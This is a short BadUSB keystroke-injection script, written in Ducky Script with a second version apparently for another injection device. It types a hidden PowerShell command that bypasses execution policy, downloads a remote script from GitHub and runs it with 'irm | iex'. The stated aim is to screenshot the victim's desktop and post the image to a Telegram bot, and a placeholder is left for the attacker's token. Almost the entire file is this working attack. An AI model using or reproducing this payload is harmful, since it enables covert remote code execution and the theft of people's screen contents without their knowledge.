
REM Title: Screenshot to Telegram Bot Chat
REM Author: @beigeworm
REM Description: This script takes a screenshot of the desktop and posts to a Telegram Bot Chat.
REM Target: Windows 10

REM *SETUP*
REM replace TELEGRAM_TOKEN_HERE with your Telegram Token.

REM some setup for dukie script
DEFAULT_DELAY 100

REM open powershell (remove "-W H" to show the window)
DELAY 1000
GUI r
DELAY 750
STRING powershell -NoP -Ep Bypass -W H -C $tg='TELEGRAM_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Screen-to-Telegram/main.ps1 | iex
ENTER

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $tg='TELEGRAM_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Screen-to-Telegram/main.ps1 | iex");
delay(500);
press("ENTER");
